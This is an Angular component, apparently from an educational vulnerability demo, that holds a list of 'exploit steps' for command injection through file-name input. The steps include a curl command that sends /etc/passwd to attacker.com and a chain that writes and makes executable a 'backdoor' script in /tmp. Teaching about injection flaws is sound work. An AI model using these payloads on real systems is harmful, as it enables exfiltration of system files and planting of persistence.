import { Component, Input } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { GoodImplementationService } from '../../services/good-implementation.service';
import { BadImplementationService } from '../../services/bad-implementation.service';
import { VulnerabilityService } from '../../services/vulnerability.service';

@Component({
  selector: 'app-sql-injection',
  standalone: true,
  imports: [CommonModule, FormsModule],
  templateUrl: './SQL.component.html',
  styleUrl: './SQL.component.css',
})
export class SQL_Inject {
  @Input() isGoodImplementation: boolean = false
  showModal: boolean = false
  copiedText: string = ''

  goodUsername = '';
  goodPassword = '';

  constructor(
    private goodservice: GoodImplementationService,
    private badservices: BadImplementationService,
    private vulnerabilityService: VulnerabilityService
  ) {}

  OnGoodSubmit() {
    this.vulnerabilityService.submitCredentials(this.goodUsername, this.goodPassword);
  }

  OnBadSubmit() {
    this.vulnerabilityService.submitCredentials(this.goodUsername, this.goodPassword);
  }

  clearForm(form: any) {
    form.resetForm();
    this.vulnerabilityService.clearCredentials();
  }

  exploitSteps = {
    step1: "test.txt; whoami",
    step2: "file$(ls ../).txt",
    step3: "data.txt | curl -X POST -d @/etc/passwd attacker.com",
    step4: "input.txt && echo 'backdoor' > /tmp/exploit.sh && chmod +x /tmp/exploit.sh"
  };

  toggleModal() {
    this.showModal = !this.showModal
    if (!this.showModal) {
      this.copiedText = ''
    }
  }

  copyToClipboard(text: string, event?: Event) {
    if (event) {
      event.stopPropagation()
    }
    this.copiedText = text
    navigator.clipboard.writeText(text).catch(() => {
      this.copiedText = ''
    });
  }
}